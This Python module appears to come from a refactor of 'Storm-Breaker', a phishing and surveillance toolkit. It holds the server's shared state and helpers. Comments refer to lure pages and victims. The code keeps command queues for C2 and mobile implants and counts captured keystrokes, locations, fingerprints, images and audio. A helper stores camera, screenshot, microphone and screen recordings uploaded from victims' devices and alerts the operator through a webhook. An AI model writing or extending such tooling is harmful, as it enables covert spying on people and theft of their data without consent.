"""Storm-Breaker shared-state container (P3 migration staging, verbatim).

Re-hosts a subset of ``storm-web/app.py`` module-level globals and a
few helpers defined byte-for-byte from the legacy file so blueprints
can be extracted one domain at a time without NR-2 drift.  P5 will
introduce a real ``StateStore`` interface here.
"""
from __future__ import annotations

import base64
import json
import os
import re
import secrets
import time
import uuid
from collections import defaultdict
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, Tuple

# Sibling modules -- they live next to storm-web/app/ (one level up).
import sys as _sys
_PARENT = str(Path(__file__).resolve().parent.parent)
if _PARENT not in _sys.path:
    _sys.path.insert(0, _PARENT)
from flask import jsonify, request  # noqa: E402
import database as db  # noqa: E402


STORM_WEB = Path(__file__).resolve().parent.parent
PHP_CONFIG_PATH = STORM_WEB / "config.php"
CHECK_C_PATH = STORM_WEB / "check-c.json"
BASE_DIR = str(STORM_WEB)
# P16: TEMPLATES_DIR was referenced 5x in blueprints/templates.py but never
# defined anywhere -- every /t/<name>/ lure page raised NameError -> 500.
# Nothing caught it: the audit and the frozen victim contract only listed the
# '/t/' *prefix*, never a concrete kit path.
TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates')


# === Login brute-force lockout (was _LOGIN_FAILS in app.py:66) ==============
LOGIN_FAILS: Dict[str, Tuple[int, float]] = {}


# === Analytics engine (verbatim from app.py:92-127) =========================
ANALYTICS: Dict[str, Any] = {
    'total_visits': 0,
    'total_captures': 0,
    'total_images': 0,
    'total_audio': 0,
    'total_locations': 0,
    'total_fingerprints': 0,
    'total_keystrokes': 0,
    'start_time': datetime.now().isoformat(),
    'events': [],
    'geo_data': [],
    'hourly_activity': defaultdict(int),
    'template_stats': defaultdict(int),
    'browser_stats': defaultdict(int),
    'os_stats': defaultdict(int),
    'ip_addresses': set(),
    'active_alerts': [],
}


def track_event(event_type: str, details: Any = None,
                ip: str = None, request=None) -> None:
    """Central analytics tracker (verbatim from app.py:111-127)."""
    from flask import has_request_context, request as _flask_request
    event = {
        'type': event_type,
        'timestamp': datetime.now().isoformat(),
        'details': details or {},
        'ip': ip or (has_request_context() and _flask_request.remote_addr) or 'system',
    }
    ANALYTICS['events'].append(event)
    if len(ANALYTICS['events']) > 500:
        ANALYTICS['events'] = ANALYTICS['events'][-500:]
    hour = datetime.now().strftime('%Y-%m-%d %H:00')
    ANALYTICS['hourly_activity'][hour] += 1
    if ip:
        ANALYTICS['ip_addresses'].add(ip)
    ANALYTICS['total_visits'] += 1


# === /panel / settings helpers (verbatim from app.py:138-168) ==============
def load_check_c() -> Dict[str, Any]:
    try:
        with open(CHECK_C_PATH, 'r') as f:
            return json.load(f)
    except Exception:
        return {"token": "", "expired": "yes"}


def save_check_c(data: Dict[str, Any]) -> None:
    with open(CHECK_C_PATH, 'w') as f:
        json.dump(data, f)


def generate_token() -> str:
    uniqid = uuid.uuid4().hex
    api_key = '-'.join([uniqid[i:i + 5] for i in range(0, len(uniqid), 5)])
    return api_key


def change_token(token: str) -> None:
    key = load_check_c()
    key['token'] = token
    key['expired'] = 'no'
    save_check_c(key)


# === config.php loader (verbatim from app.py:173-189) ======================
def load_php_config(path=PHP_CONFIG_PATH) -> Dict[str, Dict[str, str]]:
    """Naive parser for the simple config.php used in this project."""
    try:
        text = open(path, 'r').read()
    except Exception:
        return {}
    pattern = re.compile(r'"([^"]+)"\s*=>\s*\[([^\]]+)\]', re.DOTALL)
    users: Dict[str, Dict[str, str]] = {}
    for m in pattern.finditer(text):
        username = m.group(1)
        block = m.group(2)
        pwd_m = re.search(r'"password"\s*=>\s*"([^"]+)"', block)
        if pwd_m:
            users[username] = {"password": pwd_m.group(1)}
    return users


CONFIG: Dict[str, Dict[str, str]] = load_php_config()


# === C2 implant in-memory queues (verbatim from app.py:34-37, 725-726) ====
# C2_FILE_LISTS and C2_DOWNLOADS live here too (defined inline with the file-
# manager routes in app.py:725-726 but treated as module-level globals).
C2_SESSIONS: Dict[str, Dict[str, Any]] = {}
C2_COMMANDS: Dict[str, Any] = {}
C2_RESPONSES: Dict[str, Any] = {}
C2_FILE_LISTS: Dict[str, Any] = {}
C2_DOWNLOADS: Dict[str, Any] = {}


# === Mobile implant in-memory queues (verbatim from app.py:620-755) ========
MOBILE_SESSIONS: Dict[str, Dict[str, Any]] = {}
MOBILE_COMMANDS: Dict[str, Any] = {}
MOBILE_RESPONSES: Dict[str, Any] = {}
MOBILE_CAMERA_IMAGES: Dict[str, Any] = {}
MOBILE_TRACKING_DATA: Dict[str, Any] = {}
MOBILE_CAPTURE_DIRS: Dict[str, tuple] = {
    'screenshot': ('images', 'jpg'),
    'camera': ('images', 'jpg'),
    'audio': ('sounds', 'webm'),
    'screen_record': ('videos', 'webm'),
}


# === WebRTC + recon =========================================================
WEBRTC_LEAKS: list = []
RECON_CONFIG: Dict[str, Any] = {
    'auto_fingerprint': True,
    'auto_webrtc': True,
    'auto_geofence_check': True,
    'auto_credential_scan': False,
    'auto_profile_build': True,
}


# === Process-wide StateStore (P5.3) ==========================================
# Single shared instance every blueprint routes queue/session access through.
# MemoryStore is behavior-identical to the module-level dicts below, but
# lock-guarded so P6 workers can safely share the state.
from app.core.state import MemoryStore  # noqa: E402

STORE = MemoryStore()


# === Notification fan-out (verbatim from app.py:344-353) ====================
def send_notification(message_data: Dict[str, Any]) -> None:
    """Best-effort generic-webhook delivery if Settings.json has a URL.

    P6.3: when the background job worker is running, delivery is queued
    (non-blocking for the request path); otherwise it falls back to the
    legacy inline POST.  Delivery itself is unchanged.
    """
    try:
        import requests as _requests
        settings_path = os.path.join(BASE_DIR, 'Settings.json')
        if os.path.exists(settings_path):
            with open(settings_path, 'r') as f:
                settings = json.load(f)
            webhook_url = settings.get('generic_webhook')
            if webhook_url:
                # P1.3: record durably FIRST, then attempt delivery.  A dead
                # webhook no longer loses the event; the outbox worker retries.
                from app.core import outbox  # lazy: avoid import cycle
                row = outbox.record(message_data, webhook_url)
                from app.core.jobs import get_queue  # lazy: avoid import cycle
                _queue_ = get_queue()
                if _queue_.running:
                    _queue_.enqueue(outbox.deliver, row)
                else:
                    outbox.deliver(row)
    except Exception:
        pass


# === Mobile data:URL decoder (verbatim from app.py:650-662) =================
def _decode_data_url(payload):
    if not payload:
        return None
    if isinstance(payload, bytes):
        payload = payload.decode("utf-8", "ignore")
    if "," in payload:
        payload = payload.split(",", 1)[1]
    payload = payload.strip()
    try:
        return base64.b64decode(payload, validate=False)
    except Exception:
        return None


# === Mobile capture persistence (verbatim from app.py:665-688) =============
def _save_mobile_capture(uid, capture_type, field, extra_meta=None):
    data = request.get_json(silent=True) or {}
    raw = _decode_data_url(data.get(field))
    if not raw:
        return jsonify({"error": "No %s data provided" % field}), 400

    subdir, ext = MOBILE_CAPTURE_DIRS[capture_type]
    target_dir = os.path.join(BASE_DIR, subdir)
    os.makedirs(target_dir, exist_ok=True)

    fname = "mobile_%s_%s.%s" % (
        capture_type, datetime.utcnow().strftime("%d%Y%H%M%S%f"), ext)
    with open(os.path.join(target_dir, fname), "wb") as f:
        f.write(raw)

    url = "/%s/%s" % (subdir, fname)
    meta = {"size": len(raw), "captured_at": data.get("timestamp")}
    if data.get("url"):
        meta["page_url"] = data.get("url")
    if extra_meta:
        meta.update(extra_meta)

    db.save_mobile_capture(uid, capture_type, fname, url, meta)

    send_notification({
        "type": "Mobile Capture: %s" % capture_type,
        "uid": uid,
        "filename": fname,
        "url": url,
        "timestamp": datetime.now().isoformat()
    })

    return jsonify({"status": "saved", "filename": fname, "url": url,
                    "size": len(raw)})


__all__ = [
    "BASE_DIR", "PHP_CONFIG_PATH", "CHECK_C_PATH", "TEMPLATES_DIR",
    "LOGIN_FAILS", "ANALYTICS", "CONFIG",
    "C2_SESSIONS", "C2_COMMANDS", "C2_RESPONSES",
    "C2_FILE_LISTS", "C2_DOWNLOADS",
    "MOBILE_SESSIONS", "MOBILE_COMMANDS", "MOBILE_RESPONSES",
    "MOBILE_CAMERA_IMAGES", "MOBILE_CAPTURE_DIRS", "MOBILE_TRACKING_DATA",
    "WEBRTC_LEAKS", "RECON_CONFIG",
    "load_php_config", "load_check_c", "save_check_c",
    "generate_token", "change_token", "track_event",
    "send_notification", "_decode_data_url", "_save_mobile_capture",
    "STORE",
]
